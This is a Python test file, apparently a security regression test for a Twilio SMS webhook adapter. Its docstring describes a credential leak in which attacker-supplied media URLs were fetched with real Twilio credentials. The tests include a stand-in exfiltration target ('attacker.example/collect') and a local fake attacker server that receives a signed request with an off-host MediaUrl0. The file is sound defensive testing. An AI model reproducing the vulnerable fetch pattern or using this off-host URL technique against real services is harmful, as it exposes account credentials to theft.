"""Round three addendum to docs/fix_security_breach.md.

twilio_sms/adapter.py's `_download_media()` fetched an attacker-suppliable
`MediaUrl{i}` (straight out of the inbound webhook form) with
`auth=(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)` — the real Basic-Auth
credentials — and no host allowlist. The generic gateway route
(`/v1/channels/{name}/webhook`) never verified Twilio's `X-Twilio-Signature`
either; that check has only ever lived in the separate, optional standalone
receiver (catalogue/twilio_sms/webhook.py + server.py), not in the shared
route every channel actually goes through.

Two independent fixes, tested here:
  1. `_download_media` only ever fetches from `https://api.twilio.com` —
     an attacker-controlled `MediaUrl0` is refused before any request
     (and therefore any credential) leaves the process.
  2. `channel_webhook` verifies `X-Twilio-Signature` for `twilio_sms`
     before ever calling into the adapter, reusing the group's own
     tested `validate_signature()` — an unsigned or tampered request
     never reaches `on_message` at all.
"""

from __future__ import annotations

import http.server
import threading
import time

import pytest

from glc.channels.catalogue.twilio_sms.adapter import Adapter
from glc.channels.catalogue.twilio_sms.webhook import compute_signature


@pytest.fixture
def twilio_env(monkeypatch):
    monkeypatch.setenv("TWILIO_ACCOUNT_SID", "ACdemoSID0000000000000000000000")
    monkeypatch.setenv("TWILIO_AUTH_TOKEN", "demo-secret-auth-token")


async def test_download_media_refuses_non_twilio_host(twilio_env):
    adapter = Adapter(config={})
    with pytest.raises(ValueError, match="untrusted host"):
        await adapter._download_media("https://attacker.example/collect")


async def test_download_media_refuses_plain_http_even_on_allowed_host(twilio_env):
    """Scheme matters too — https://api.twilio.com is allowed, but a
    downgrade to plain http (e.g. via a MediaUrl an attacker crafted
    with a homograph host that resolves differently, or a MITM'd
    redirect) must not slip through on hostname alone."""
    adapter = Adapter(config={})
    with pytest.raises(ValueError, match="untrusted host"):
        await adapter._download_media("http://api.twilio.com/2010-04-01/Accounts/AC/Media/ME")


def test_channel_webhook_rejects_unsigned_twilio_request(twilio_env, app_client):
    resp = app_client.post(
        "/v1/channels/twilio_sms/webhook",
        data={"From": "+15005550006", "To": "+15005550001", "Body": "hi"},
    )
    assert resp.status_code == 403


def test_channel_webhook_rejects_tampered_twilio_signature(twilio_env, app_client):
    body = {"From": "+15005550006", "To": "+15005550001", "Body": "hi"}
    sig = compute_signature("wrong-token", "http://testserver/v1/channels/twilio_sms/webhook", body)
    resp = app_client.post(
        "/v1/channels/twilio_sms/webhook", data=body, headers={"X-Twilio-Signature": sig}
    )
    assert resp.status_code == 403


def test_channel_webhook_accepts_correctly_signed_twilio_request(twilio_env, app_client):
    body = {"From": "+15005550006", "To": "+15005550001", "Body": "hi", "NumMedia": "0"}
    sig = compute_signature(
        "demo-secret-auth-token", "http://testserver/v1/channels/twilio_sms/webhook", body
    )
    resp = app_client.post(
        "/v1/channels/twilio_sms/webhook", data=body, headers={"X-Twilio-Signature": sig}
    )
    assert resp.status_code == 200
    assert resp.json() == {"status": "ok"}


def test_signed_request_with_off_host_media_url_never_leaks_credentials(twilio_env, app_client):
    """End-to-end: even a *validly signed* request whose MediaUrl0 points
    off-host must never cause the real Twilio credentials to leave the
    process toward that host. A local HTTP server stands in for the
    attacker's collector; if the Basic-Auth header ever arrives there,
    the fix has failed."""
    captured: dict[str, str | None] = {}

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            captured["auth_header"] = self.headers.get("Authorization")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"x")

        def log_message(self, *a):
            pass

    server = http.server.HTTPServer(("127.0.0.1", 0), Handler)
    port = server.server_port
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        body = {
            "From": "+15005550006",
            "To": "+15005550001",
            "Body": "hi",
            "NumMedia": "1",
            "MediaUrl0": f"http://127.0.0.1:{port}/collect",
            "MediaContentType0": "image/jpeg",
        }
        sig = compute_signature(
            "demo-secret-auth-token", "http://testserver/v1/channels/twilio_sms/webhook", body
        )
        resp = app_client.post(
            "/v1/channels/twilio_sms/webhook", data=body, headers={"X-Twilio-Signature": sig}
        )
        assert resp.status_code == 200

        for _ in range(20):
            if "auth_header" in captured:
                break
            time.sleep(0.05)
    finally:
        server.shutdown()
        thread.join(timeout=2)

    assert "auth_header" not in captured, (
        f"Twilio credentials were sent to the attacker-controlled host: {captured.get('auth_header')!r}"
    )
